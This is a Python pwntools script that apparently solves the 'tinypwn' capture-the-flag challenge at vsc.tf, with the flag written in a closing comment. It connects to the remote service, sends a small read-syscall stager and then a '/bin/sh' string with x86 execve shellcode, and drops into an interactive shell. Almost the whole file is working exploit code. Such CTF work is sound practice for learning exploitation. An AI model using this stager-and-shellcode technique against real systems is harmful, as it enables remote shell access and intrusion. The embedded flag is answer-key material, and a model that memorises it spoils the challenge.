#!/usr/bin/env python3

from pwn import *
import ctypes

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

#exe = ELF("./tinypwn")

#context.binary = exe
context.arch = "x86_32"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	#if args.LOCAL:
	#	r = gdb.debug([exe.path])
	if args.REMOTE:
		r = remote("vsc.tf", 3026)
	#else:
	#	r = process([exe.path])
	return r


read_100 = '''
xor ebx, ebx
push 3
pop eax
push 100
pop edx
int 0x80
'''

shellcode = "nop\n" * 0x10 + '''
mov eax, 0x0b
mov ebx, ecx
xor ecx, ecx
xor edx, edx
int 0x80
'''


def main():
	r = conn()

	read_compiled = asm(read_100)
	print(read_compiled.hex())
	r.send(read_compiled)

	shell_compiled = asm(shellcode)
	payload = b"/bin/sh\x00" + shell_compiled
	print(payload.hex())
	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()

# vsctf{ELF_g0lf_sh3llc0d3_g0lf_4ll_th15_g0lf1ng_hurt5_my_h34d}
